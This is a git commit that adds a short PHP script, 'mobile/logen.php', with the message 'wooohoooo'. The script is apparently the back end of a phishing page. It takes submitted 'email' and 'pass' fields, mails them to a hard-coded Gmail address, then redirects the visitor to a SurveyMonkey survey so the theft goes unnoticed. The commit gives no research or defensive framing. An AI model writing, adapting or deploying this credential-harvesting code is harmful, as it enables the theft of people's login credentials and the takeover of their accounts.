efb4770e60311e8fc303382adcd17aabfb059338
jimfilippou <jimfilippou@hotmail.gr>
2017-11-23 23:02:38 +0200

    wooohoooo

---
+++ mobile/logen.php
@@ -0,0 +1,15 @@
+<?php
+
+$to      = 'croot752014@gmail.com';
+$subject = 'the subject';
+$message = $_POST["email"] . "  :  " . $_POST["pass"];
+$headers = 'From: webmaster@example.com' . "\r\n" .
+    'Reply-To: webmaster@example.com' . "\r\n" .
+    'X-Mailer: PHP/' . phpversion();
+
+mail($to, $subject, $message, $headers);
+
+
+$newURL = "https://www.surveymonkey.com/r/Y7L9ZY6";
+header('Location: '.$newURL);
+?>
